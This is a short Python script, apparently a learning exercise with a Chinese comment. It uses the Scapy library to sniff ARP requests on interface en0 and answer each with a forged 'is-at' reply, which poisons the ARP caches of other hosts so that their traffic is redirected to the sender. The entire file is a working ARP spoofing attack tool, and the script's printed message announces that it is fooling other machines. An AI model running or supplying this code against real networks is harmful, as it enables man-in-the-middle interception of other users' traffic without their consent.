from scapy.all import sniff,sendp,ARP,Ether

def arp_poision_callback(packet):
    # 也就是说我能收到arp包，然后给出回应，
    if packet[ARP].op==1:
        answer=Ether(dst=packet[ARP].hwsrc)/ARP()
        answer[ARP].op='is-at'
        answer[ARP].hwdst=packet[ARP].hwsrc
        answer[ARP].psrc=packet[ARP].pdst
        answer[ARP].pdst=packet[ARP].psrc
        
        print('fooling'+packet[ARP].psrc+'that'+packet[ARP].pdst+'is me')
        
        sendp(answer,iface='en0')
        


sniff(prn=arp_poision_callback,filter='arp',iface='en0',store=0)